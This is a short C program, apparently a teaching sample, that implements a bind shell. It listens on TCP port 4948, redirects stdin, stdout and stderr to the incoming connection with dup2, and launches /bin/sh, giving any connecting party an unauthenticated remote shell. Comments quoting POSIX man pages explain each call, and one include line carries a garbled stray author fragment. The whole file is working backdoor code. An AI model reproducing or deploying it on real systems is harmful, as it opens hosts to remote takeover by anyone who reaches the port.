/**
	Date 31/08/2014
	
	This program waits for an entry connection and redirects a
	shell to the remote machine
**/

#include <unistd.h> uthor Javier Tejedor
#include <unistd.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

	int remoteConnection; 
	int i; 
	int socketC;

	/**
		#include <netinet/in.h>
		sockaddr_in

		Structures for handling internet addresses
	**/
	struct sockaddr_in sin;
	sin.sin_family 		= AF_INET;
	sin.sin_addr.s_addr 	= 0;
	sin.sin_port 		= htons(4948);
	
	/**
		socket - create an endpoint for communication
		The socket() function shall create an unbound 
		socket in a communications domain, and return 
		a file descriptor that can be used in later 
		function calls that operate on sockets.

		#include <sys/socket.h>
    		int socket(int domain, int type, int protocol);
	**/
	socketC = socket(AF_INET, SOCK_STREAM, 0);

	/**
	  	bind - bind a name to a socket
	  	The bind() function shall assign a local socket address address
	  	to a socket identified by descriptor socket that has no local 
		socket address assigned. Sockets created with the socket() function 
		are initially unnamed; they are identified only by their address family.

    		#include <sys/socket.h>
    		int bind(int socket, const struct sockaddr *address, socklen_t address_len);

	**/
	bind(socketC, (struct sockaddr *)&sin, sizeof(sin));
	
	/**
	  	listen - listen for socket connections and limit 
		the queue of incoming connection		
	  	The listen() function shall mark a connection-mode socket, specified by the socket argument, as accepting connections.

	  	#include <sys/socket.h>
    		int listen(int socket, int backlog);

	**/
	listen(socketC, 5);

	/**
		The accept() function shall extract the first connection 
		on the queue of pending connections, create a new socket 
		with the same socket type protocol and address family as 
		the specified socket, and allocate a new file descriptor for that socket.
		
		#include <sys/socket.h>
		int accept(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
	**/
	remoteConnection = accept(socketC, NULL, 0);

	/**
		The dup2() duplicates one file descriptor, making them 
		aliases, and then deleting the old file descriptor. This 
		becomes very useful when attempting to redirect output.

		We call three times passing as paratemers in fildes2:
		- 0: stdin
		- 1: stdout
		- 2: stderr

		#include <unistd.h>
		int dup2(int fildes, int fildes2);
	**/
	for(i = 0; i < 3; i++){
		dup2(remoteConnection, i);
	}

	/**
		execve - execute program

    		#include <unistd.h>
	  	int execve(const char *filename, char *const argv[], char *const envp[]);

	**/
	//because we are redirect the output of the connection, when we execute it, we are redirecting a shell 
	//to the remote machine
	execve("/bin/sh", NULL, NULL);

}
